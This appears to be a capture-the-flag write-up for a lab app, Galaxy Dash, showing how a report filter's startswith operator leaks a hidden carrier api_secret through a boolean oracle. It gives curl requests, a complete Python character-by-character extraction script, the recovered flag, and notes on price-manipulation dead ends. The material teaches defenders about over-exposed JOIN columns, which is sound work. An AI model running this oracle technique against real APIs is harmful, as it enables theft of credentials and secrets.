---
title: Galaxy Dash - Report Filter Secret Oracle
tags:
  - bugforge
  - information-disclosure
  - filter-injection
  - boolean-oracle
  - multi-tenant
  - source-maps
aliases:
  - "/bugforge/galaxy-dash-report-filter-oracle/"
  - "/BugForge/Galaxy-Dash---Report-Filter-Oracle"
---

- Galaxy Dash - a Futurama-themed B2B intergalactic delivery booking platform
- Multi-tenant: every registration creates a separate organization; all booking data is org-scoped
- The Report Builder API accepts a nested JSON `filter` with far more fields and operators than the UI exposes
- A joined relation (`carrier`) carries a hidden `api_secret` column holding the flag
- The `startswith` operator turns the report into a boolean oracle that leaks the secret character by character

## Enumeration

Set the target:

```bash
TARGET="https://lab-XXXXX.labs-app.bugforge.io"
```

Register needs `username`, `email`, `password`, `org_name`:

```bash
curl -sk -X POST "$TARGET/api/register" \
  -H 'Content-Type: application/json' \
  -d '{"username":"mike1","email":"mike1@lab.test","password":"pass1234","org_name":"mikeorg"}'
# -> {"token":"<JWT>","user":{"id":5,"role":"org_admin","organizationId":4,...}}
```

- Every registration lands in a fresh org (first user id 5, first org id 4 - ids 1-4 / 1-3 are seeded and unreadable). 
- Auth is a signed HS256 JWT; signature is enforced and the secret is not in any sane wordlist.

- The app surface is small and fully enumerable from the source-mapped React bundle:

| Area | Endpoints |
|---|---|
| auth | `POST /api/register`, `POST /api/login`, `GET /api/verify-token` |
| bookings | `GET/POST /api/bookings`, `GET/PUT/DELETE /api/bookings/:id`, `GET /api/bookings/stats/summary` |
| pricing | `POST /api/calculate-price` |
| invoices | `GET /api/invoices/:bookingId` (lazy-generated, stored on delivery) |
| reports | `GET /api/reports/bookings?filter=<JSON>` |
| org/team | `GET/PUT /api/organization`, `GET/POST/PUT/DELETE /api/team[/:id]` |
| reference | `GET /api/services`, `GET /api/integrations`, `GET /api/locations` |

## The Report Builder

- The Reports page filters deliveries with three dropdowns. The frontend builds this filter (`Reports.js`):

```javascript
if (filters.status)       filter.status  = { eq: filters.status };
if (filters.service_name) filter.service = { name: { eq: filters.service_name } };
if (filters.carrier_name) filter.carrier = { name: { eq: filters.carrier_name } };
// GET /api/reports/bookings?filter=<urlencoded JSON>
```

- The page subtitle says it plainly: *"Filter your organization's deliveries across **any dimension**."* 
- The server accepts a lot more than the three UI fields.

## Mapping the filter whitelist

- Probe every candidate field and relation; the validator answers `Invalid filter: Unknown field 'x'` for anything not whitelisted, and `200` for anything accepted:

```bash
FILTER='%7B%22danger_level%22%3A%7B%22eq%22%3A5%7D%7D'   # {"danger_level":{"eq":5}}
curl -sk "$TARGET/api/reports/bookings?filter=$FILTER" \
  -H "Authorization: Bearer $TOKEN"
```

What is accepted (top-level booking fields):

```
id, status, cargo_description, cargo_size, cargo_weight_kg, danger_level,
total_price, delivery_success, has_insurance, has_premium_tracking,
calculated_risk_percent, created_at, delivery_date
```

And joined relations, one level deep:

```
organization.{id,name,status,business_type,headquarters_planet}
created_by.{id,username,role,full_name}
carrier.{id,name,status,carrier_code,contact_hub,is_internal,created_at,api_secret}
service.{id,name,description,earth_only}
origin.{id,name,planet,sector}   destination.{id,name,planet,sector}
```

Two things matter here:

1. **The response rows are NOT the filter surface.** Report rows always show the same 11 columns (`id, status, cargo_size, cargo_description, total_price, created_at, delivery_date, service_name, carrier_name, origin_name, destination_name`). The filter reaches *joined columns the serializer never prints*. A column the response hides is still queryable.
2. **`carrier.api_secret` is filterable but invisible.** Nothing in the UI, the booking detail, or the report output ever shows it - but the JOIN used for `carrier.name` filtering exposes it to the query builder.

This is where a hand-built wordlist fails quietly: mine had `api_key`, `apiKey`, `secret`, `secret_key`, `auth_token`, `credentials` - but not the literal string `api_secret`. One missing word reads as "no such field" and the whole lead dies. Include every case variant of every secret-shaped noun: `api_secret`, `client_secret`, `webhook_secret`, `private_key`, `signing_key`, `access_token`.

## Operators: eq and startswith

- Operator validation rejects anything it doesn't know (`Invalid filter: Unsupported operator 'x'`). 
- The complete list is short, and it is **all lowercase**:

```
eq           works
startswith   works
```

- `startsWith`, `starts_with`, `contains`, `like`, `ne`, `gt`, `$ne`, `$regex` etc. are all rejected. (A neighboring lab teaches this exact lesson: spray operators in lowercase first, then camelCase.)

- Only the *first* key of an operator object is validated and applied - `{"status":{"eq":"x","ne":"y"}}` silently drops the `ne`. No operator smuggling.

## The oracle

- `GET /api/reports/bookings` returns `{"count": N, "bookings": [...]}`. 
- Create one booking with the internal carrier (id 3, "Galaxy Dash Internal") so there is at least one row to match:

```bash
curl -sk -X POST "$TARGET/api/bookings" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"origin_location_id":1,"destination_location_id":2,"cargo_size":"medium",
       "cargo_weight_kg":500,"cargo_description":"oracle row","danger_level":0,
       "has_insurance":false,"has_premium_tracking":false,"service_id":3,"carrier_id":3}'
```

Now ask a yes/no question about the secret:

```bash
# Does carrier 3's api_secret start with "bug{" ?
curl -sk "$TARGET/api/reports/bookings" \
  -H "Authorization: Bearer $TOKEN" \
  --get --data-urlencode 'filter={"carrier":{"id":{"eq":3},"api_secret":{"startswith":"bug{"}}}'
# {"count":1,"bookings":[...]}   -> yes
```

- `count > 0` means the prefix is right. 
- `count: 0` means it isn't. 
- That is a complete extraction oracle over the joined secret. 
- Tenant scoping is irrelevant here - the leak is not another org's rows, it is a secret column on a *reference table* the JOIN touches.

## Extraction script

- Brute-force one character at a time; the alphabet for BugForge flags is `[a-zA-Z0-9]` plus the closing brace. 
- Roughly 33 requests per character worst case, a few minutes total:

```python
#!/usr/bin/env python3
"""Extract carrier.api_secret from Galaxy Dash via the report filter startswith oracle."""
import json, urllib.parse, requests

TARGET = "https://lab-XXXXX.labs-app.bugforge.io"
TOKEN  = "<your JWT>"
CHARS  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

def count_for(prefix: str) -> int:
    f = json.dumps({"carrier": {"id": {"eq": 3},
                                 "api_secret": {"startswith": prefix}}})
    r = requests.get(
        f"{TARGET}/api/reports/bookings",
        params={"filter": f},
        headers={"Authorization": f"Bearer {TOKEN}"},
        timeout=15,
    )
    return r.json()["count"]

prefix = "bug{"
assert count_for(prefix) > 0, "oracle dead - no carrier-3 booking or wrong field"

while not prefix.endswith("}"):
    hit = next((c for c in CHARS + "}" if count_for(prefix + c) > 0), None)
    if hit is None:
        raise SystemExit(f"stuck at {prefix!r} - widen charset")
    prefix += hit
    print(prefix)

print("FLAG:", prefix)
```

Verify the recovered value with an exact match (and a one-char-off control):

```bash
# exact -> count:1 ; one char changed -> count:0
curl -sk "$TARGET/api/reports/bookings" -H "Authorization: Bearer $TOKEN" \
  --get --data-urlencode \
  'filter={"carrier":{"id":{"eq":3},"api_secret":{"eq":"bug{ukPKns26LvNLLicDFzSR2jd7N8Lob9vz}"}}}'
```

## Why the scope checks don't save it

- Every row-level check on this endpoint is solid: the report is hard-scoped to the caller's org (verified with a canary booking in a second org and a positive control), IDOR on `/api/bookings/:id` and `/api/invoices/:id` is blocked, and the filter validator rejects unknown fields. 
- The leak is one layer over: the JOIN that powers the friendly `carrier.name` filter also exposes *every other column* of the carriers table to the query builder, including the seeded `api_secret`. 
- If a column must stay secret, it must not be selectable through the relation at all - hiding it from the row serializer changes nothing.

## Things that were NOT the flag (confirmed dead ends)

Hours went into these... all real bugs, none is the lab's answer:

- **Price manipulation** - `danger_level` and `cargo_weight_kg` are unbounded server-side (UI slider says 0-5). `price = base * (1 + 0.15 * danger)`, so `danger_level: -10` yields an invoice total of `-187.50`, and `danger_level: 1e999` stores NULL but makes the invoice compute `"total": "Infinity"`.
- **Insurance theatre** - insurance costs 15% (baked into `total_price`) but a failed delivery still bills the customer in full; the invoice's insurance/tracking line items are excluded from its own total anyway.
- **Delivery failure exists** - deliveries fail probabilistically on `calculated_risk_percent` (~2.5% on short routes, 95% long-haul). The failure note and failed invoice contain no flag.
- **Loose equality** - `service_id: true` validates as service 1 (Lightning Dash) via `==`, but the earth-only and price paths re-resolve correctly.
- **tax_id** - stored at `/api/register`, stripped from `PUT /api/organization`, rendered on every invoice. A genuine hidden field on a report, just not *the* one.
- JWT tampering (signature enforced), login/register/team mass-assignment (stripped), qs/NoSQL operator injection (parameterized), SSTI (verbatim echo), phantom detector sweep (bac, idor, mass-assign, sqli, pp - all negative).
